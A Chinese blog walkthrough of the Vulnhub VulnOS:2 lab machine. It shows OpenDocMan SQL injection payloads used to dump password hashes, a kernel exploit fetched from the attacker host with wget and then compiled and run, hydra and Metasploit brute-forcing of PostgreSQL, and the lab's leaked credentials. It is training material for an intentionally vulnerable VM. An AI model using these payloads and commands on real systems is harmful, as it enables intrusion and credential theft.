---
title: Vulnhub-VULNOS:2  
date: 2024-02-05  
categories: [Training platform,Vulnhub]  
tags: [Vulnhub,web]  
permalink: "/Vulnhub/Vulnos2.html"
---

# VULNOS: 2

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402050338465.png" alt="image-20240202232815010" style="zoom:33%;" />

使用`virtualbox`双击`VulnOSv2.vbox`打开靶场，启动显示有错误，这是很正常的，调整为nat试试：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402050338467.png" alt="image-20240204234543209" style="zoom:33%;" />

打开倒是正常打开了，但是刚刚加载的时候好像看到有几个报错。。。。

尝试扫一下，看看能不能扫到吧：

![image-20240204234701649](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402050338468.png)

## 无法找到IP解决办法

果然。。。。。尝试修改一下配置文件，但是配置文件上面写着不要编辑，尝试改成`vmdk`文件吧：

```shell
VBoxManage.exe clonehd E:\vulnhub\VulnOSv2\VulnOSv2.vdi E:\vulnhub\VulnOSv2\VulnOSv2.vmdk --format VMDK
# 0%...10%...20%...30%...40%...50%...60%...70%...80%...90%...100%
# Clone medium created in format 'VMDK'. UUID: 562b1927-9aec-4be4-8ad4-5701583c2cc8
vmware-vdiskmanager.exe -r "E:\vulnhub\VulnOSv2\VulnOSv2.vmdk" -t 0 "E:\vulnhub\VulnOSv2\VulnOSv2.com.vmdk"
# Creating disk 'E:\vulnhub\VulnOSv2\VulnOSv2.com.vmdk'
# Convert: 100% done.
# Virtual disk conversion successful.
```

创建一个虚拟机打开创建好的硬盘试试：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402050338469.png" alt="image-20240205003709541" style="zoom:67%;" />

可以扫到了，打开查看一下正不正确，

![image-20240205003910159](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402050338470.png)

一切正常，下面可以开始进行公鸡辣！

## 信息搜集

### 端口扫描

```shell
nmap -sV -p- -A  192.168.244.184
# 22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)
# | ssh-hostkey: 
# |   1024 f5:4d:c8:e7:8b:c1:b2:11:95:24:fd:0e:4c:3c:3b:3b (DSA)
# |   2048 ff:19:33:7a:c1:ee:b5:d0:dc:66:51:da:f0:6e:fc:48 (RSA)
# |   256 ae:d7:6f:cc:ed:4a:82:8b:e8:66:a5:11:7a:11:5f:86 (ECDSA)
# |_  256 71:bc:6b:7b:56:02:a4:8e:ce:1c:8e:a6:1e:3a:37:94 (ED25519)
# 80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
# |_http-title: VulnOSv2
# |_http-server-header: Apache/2.4.7 (Ubuntu)
# 6667/tcp open  irc     ngircd
# Service Info: Host: irc.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

这里开启了ssh服务，等下不行的话可以尝试进行爆破。

逐一查看一下各个端口，没发现啥东西，倒是页面提示了一个`website`，源代码也没发现啥，有一个暂时不知道的疑似泄露的信息，点进`website`看看：

```html
# view-source:http://192.168.244.184/
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402050338471.png" alt="image-20240205011457063" style="zoom:50%;" />

查看一下源代码，没发现啥有用信息，随便点一下，看看有没有东西：

![image-20240205011640139](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402050338472.png)

这里看上去啥都没有，检查一下：

![image-20240205011713754](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402050338473.png)

好家伙，隐藏起来了。。。内容如下：

![image-20240205011916163](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402050338474.png)

我们查看一下这个`/jabcd0cs/`：

![image-20240205011957355](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402050338475.png)

### 插件信息

使用浏览器插件`wappalyzer`查看相关组件信息：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402050338476.png" alt="image-20240205020450249" style="zoom:33%;" />

## 漏洞利用

进来了！是个登录界面，尝试一下万能密码：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402050338477.png" alt="image-20240205012102269" style="zoom:33%;" />

注意到下面有个模板的版本号，感觉有点老，尝试进行漏洞检索：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402050338479.png" alt="image-20240205012603612" style="zoom: 50%;" />

看一下漏洞内容是啥：

```html
Advisory ID: HTB23202
Product: OpenDocMan
Vendor: Free Document Management Software
Vulnerable Version(s): 1.2.7 and probably prior
Tested Version: 1.2.7
Advisory Publication: February 12, 2014 [without technical details]
Vendor Notification: February 12, 2014
Vendor Patch: February 24, 2014
Public Disclosure: March 5, 2014
Vulnerability Type: SQL Injection [CWE-89], Improper Access Control [CWE-284]
CVE References: CVE-2014-1945, CVE-2014-1946
Risk Level: High
CVSSv2 Base Scores: 7.5 (AV:N/AC:L/Au:N/C:P/I:P/A:P), 6.5 (AV:N/AC:L/Au:S/C:P/I:P/A:P)
Solution Status: Fixed by Vendor
Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ )

------------------------------------------------------------------------
Advisory Details:
High-Tech Bridge Security Research Lab discovered multiple vulnerabilities in OpenDocMan, which can be exploited to perform SQL Injection and gain administrative access to the application.
1) SQL Injection in OpenDocMan: CVE-2014-1945
The vulnerability exists due to insufficient validation of "add_value" HTTP GET parameter in "/ajax_udf.php" script. A remote unauthenticated attacker can execute arbitrary SQL commands in application's database.
The exploitation example below displays version of the MySQL server:
http://[host]/ajax_udf.php?q=1&add_value=odm_user%20UNION%20SELECT%201,v
ersion%28%29,3,4,5,6,7,8,9

2) Improper Access Control in OpenDocMan: CVE-2014-1946
The vulnerability exists due to insufficient validation of allowed action in "/signup.php" script when updating userâ??s profile. A remote authenticated attacker can assign administrative privileges to the current account and gain complete control over the application.

The exploitation example below assigns administrative privileges for the current account:
<form action="http://[host]/signup.php" method="post" name="main">
<input type="hidden" name="updateuser" value="1">
<input type="hidden" name="admin" value="1">
<input type="hidden" name="id" value="[USER_ID]">
<input type="submit" name="login" value="Run">
</form>
------------------------------------------------------------------------
Solution:
Update to OpenDocMan v1.2.7.2
More Information:
http://www.opendocman.com/opendocman-v1-2-7-1-release/
http://www.opendocman.com/opendocman-v1-2-7-2-released/
------------------------------------------------------------------------
References:
[1] High-Tech Bridge Advisory HTB23202 - https://www.htbridge.com/advisory/HTB23202 - Multiple vulnerabilities in OpenDocMan.
[2] OpenDocMan - http://www.opendocman.com/ - Open Source Document Management System written in PHP.
[3] Common Vulnerabilities and Exposures (CVE) - http://cve.mitre.org/ - international in scope and free for public use, CVEÂ® is a dictionary of publicly known information security vulnerabilities and exposures.
[4] Common Weakness Enumeration (CWE) - http://cwe.mitre.org - targeted to developers and security practitioners, CWE is a formal list of software weakness types.
[5] ImmuniWebÂ® - http://www.htbridge.com/immuniweb/ - is High-Tech Bridge's proprietary web application security assessment solution with SaaS delivery model that combines manual and automated vulnerability testing.
------------------------------------------------------------------------

Disclaimer: The information provided in this Advisory is provided "as is" and without any warranty of any kind. Details of this Advisory may be updated in order to provide as accurate information as possible. The latest version of the Advisory is available on web page [1] in the References.   
```

可以看到有俩漏洞有机会利用一下，第一个是sql注入漏洞，尝试一下这个payload：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402050338480.png" alt="image-20240205013925779" style="zoom:50%;" />

获取到了信息！但是还不够，尝试对payload进行修改，获取相关的密码：

```php
/ajax_udf.php?q=1&add_value=odm_user UNION SELECT 1,password,3,4,5,6,7,8,9 from odm_user
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402050338481.png" alt="image-20240205015224594" style="zoom:33%;" />

![image-20240205015252209](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402050338482.png)

查看一下加密方式：

```shell
hash-identifier b78aae356709f8c31118ea613980954b
```

![image-20240205015456898](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402050338483.png)

去[解密](https://www.somd5.com/)一下这俩：

```text

webmin: b78aae356709f8c31118ea613980954b  -->  webmin1980
guest:  084e0343a0486ff05530df6c705c8bb4  -->  guest
```

尝试 ssh 登录一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402050338484.png" alt="image-20240205020244918" style="zoom:50%;" />

## 提权

### 系统内核提权

```shell
uname -a
# Linux VulnOSv2 3.13.0-24-generic #47-Ubuntu SMP Fri May 2 23:31:42 UTC 2014 i686 i686 i686 GNU/Linux
lsb_release -a
# No LSB modules are available.
# Distributor ID: Ubuntu
# Description:    Ubuntu 14.04.4 LTS
# Release:        14.04
# Codename:       trusty
```

搜索一下相关漏洞：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402050338485.png" alt="image-20240205020857068" style="zoom:50%;" />

找到好几个本地提权漏洞，版本和其他信息都比较符合，一个一个试：

- [ ] 31347.c
- [x] 37292.c

运气不戳！！！

![image-20240205022612638](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402050338486.png)

```shell
# Client
python3 -m http.server 8888
# Server
wget http://192.168.244.133:8888/37292.c
gcc 37292.c
chmod +x a.out
./a.out
ls /root
# flag.txt
cat /root/flag.txt
# Hello and welcome.
# You successfully compromised the company "JABC" and the server completely !!
# Congratulations !!!
# Hope you enjoyed it.

# What do you think of A.I.?
```

 获取到 flag 了！！！

## 额外收获

看到[师傅的这个做法](https://blog.csdn.net/elephantxiang/article/details/121643471?spm=1001.2101.3001.6650.3&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-3-121643471-blog-111188731.235%5Ev43%5Econtrol&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-3-121643471-blog-111188731.235%5Ev43%5Econtrol&utm_relevant_index=4)，让我才知道作者留了彩蛋！[原方法的师傅wp](https://g0blin.co.uk/vulnos-2-vulnhub-writeup/)在此！

拿到`webmin`以后，查找一下有无其他用户：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402050338487.png" alt="image-20240205023624829" style="zoom: 67%;" />

不过遗憾的是这个目录是进不去的，继续再`webmin`内查找一下：

```shell
cd webmin
ls -la
# total 596
# drwxr-x--- 3 webmin webmin   4096 May  3  2016 .
# drwxr-xr-x 4 root   root     4096 Apr 16  2016 ..
# -rw------- 1 webmin webmin     85 May  4  2016 .bash_history
# -rw-r--r-- 1 webmin webmin    220 Apr  9  2014 .bash_logout
# -rw-r--r-- 1 webmin webmin   3637 Apr  9  2014 .bashrc
# drwx------ 2 webmin webmin   4096 Apr 30  2016 .cache
# -rw-rw-r-- 1 webmin webmin 579442 Apr 30  2016 post.tar.gz
# -rw-r--r-- 1 webmin webmin    675 Apr  9  2014 .profile
tar zxvf post.tar.gz
```

解压结果中含有大量的爆破信息：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402050338488.png" alt="image-20240205023918141" style="zoom:50%;" />

猜测要使用`hydra`进行爆破！

先查看一下`linux`系统监听：

```bash
netstat -ano
# netstat: 用于显示网络状态的命令。
# -t: 仅显示 TCP 连接。
# -u: 仅显示 UDP 连接。
# -l: 仅显示监听状态的套接字。
# -n: 使用数字形式显示地址和端口号。
# -p: 显示进程标识符（PID）和进程名称。
```

![image-20240205024927613](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402050338489.png)

不知道这个`postgresql`是个啥，但是和之前爆破的应该有关系（按照师傅的思路走！）

> PostgreSQL（通常简称为 Postgres）是一个开源的关系型数据库管理系统（RDBMS），它的设计目标是提供高度可扩展性、灵活性和丰富的功能集。PostgreSQL 不仅支持标准的 SQL 查询语言，还提供了许多高级功能，如复杂的数据类型、事务、触发器、视图、存储过程等。

```shell
netstat -ant
netstat -at
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402050338490.png" alt="image-20240205025739953" style="zoom: 50%;" />

### 靶机本地爆破

这个看到`postgresql`是使用的`5431`端口，而这个端口是没有开放的，所以我们只能本地进行爆破啦：

```shell
# 本地下载hydra，刚刚那个post里就是！
cd post
./configure
make
# 验证是否安装完成
hydra --help
```

我这里发生了报错：

![image-20240205030228353](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402050338491.png)

尝试移到`/tmp`进行操作，还是不行。。。。不管他试试：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402050338492.png" alt="image-20240205030902667" style="zoom:50%;" />

执行命令：

```shell
# Client
cd /usr/share/metasploit-framework/data/wordlists
python3 -m http.server 8888
# Server
wget http://192.168.244.133:8888/postgres_default_pass.txt
./hydra -L postgres_default_pass.txt -P postgres_default_pass.txt localhost postgres
# Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
# Hydra (http://www.thc.org/thc-hydra) starting at 2024-02-04 19:57:00
# [DATA] max 16 tasks per 1 server, overall 64 tasks, 25 login tries (l:5/p:5), ~0 tries per task
# [DATA] attacking service postgres on port 5432
# [5432][postgres] host: localhost   login: postgres   password: postgres
# 1 of 1 target successfully completed, 1 valid password found
# Hydra (http://www.thc.org/thc-hydra) finished at 2024-02-04 19:57:01
```

### 端口转发攻击端爆破

这是原本作者的做法：

```shell
# 本地kali-终端1
ssh webmin@192.168.244.184 -L 5432:localhost:5432
# 另起一个终端kali-终端2
msfconsole
use auxiliary/scanner/postgres/postgres_login
set RHOSTS 127.0.0.1 
run
```

![image-20240205033655630](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402050338493.png)

这种构思也太巧妙了，真牛逼，记下来了！！

### 登录高权限账号

我们就获取了账号密码：`login: postgres`还有`password: postgres`。

登录`postpresql`，获取账号密码：

```shell
psql -h localhost -U postgres
\l
#                                   List of databases
#    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
# -----------+----------+----------+-------------+-------------+-----------------------
#  postgres  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
#  system    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =CTc/postgres        +
#            |          |          |             |             | postgres=CTc/postgres
#  template0 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
#            |          |          |             |             | postgres=CTc/postgres
#  template1 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
#            |          |          |             |             | postgres=CTc/postgres
# (4 rows)
\c system
# SSL connection (cipher: DHE-RSA-AES256-GCM-SHA384, bits: 256)
# You are now connected to database "system" as user "postgres".
\dt
#          List of relations
#  Schema | Name  | Type  |  Owner   
# --------+-------+-------+----------
#  public | users | table | postgres
# (1 row)
select * from users;
#  ID |  username   |    password     
# ----+-------------+-----------------
#   1 | vulnosadmin | c4nuh4ckm3tw1c3
```

获取到了`username:vulnosadmin`，还有`password:c4nuh4ckm3tw1c3`，尝试进行登录：

```shell
ssh vulnosadmin@192.168.244.184
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402050338494.png" alt="image-20240205032339022" style="zoom:50%;" />

可以看到一个`blender`文件，下载到本地，打开看一下！

```
# 靶机
ifconfig
python -m SimpleHTTPServer 8888
# kali
wget http://192.168.244.184:8888/r00t.blend
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402050338495.png" alt="image-20240205032633876" style="zoom:50%;" />

我宿主机上面有`blender`，我直接拿到宿主机上看了嗷！

打开啥都没有，但是右边有个`text`，这是最简单的隐写啦！

![image-20240205032807984](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402050338496.png)

猜测这就是`root`用户的密码啦，尝试连接一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402050338497.png" alt="image-20240205032949950" style="zoom:50%;" />

```shell
ssh root@192.168.244.184
# password:ab12fg//drg
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402050338498.png" alt="image-20240205033153881" style="zoom: 50%;" />

同样可以获取flag！！！！
